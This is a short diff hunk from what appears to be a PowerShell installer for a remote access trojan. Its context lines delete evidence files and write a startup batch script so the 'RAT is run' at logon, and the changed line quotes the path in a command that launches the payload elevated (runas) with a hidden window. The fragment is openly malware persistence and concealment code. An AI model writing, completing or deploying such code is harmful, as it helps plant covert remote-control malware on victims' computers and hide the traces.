@@ -43,7 +43,7 @@ Remove-Item $evidence
 
 # Add a startup script (BAT) to make sure RAT is run by the logging user
 add-content $startup "@echo off"
-add-content $startup "powershell -c start -verb runas $localpath -windowstyle hidden" 
+add-content $startup "powershell -c start -verb runas `'$localpath`' -windowstyle hidden" 
 add-content $startup "echo $hostname"
 
 # Rename the computer according to the Arguments
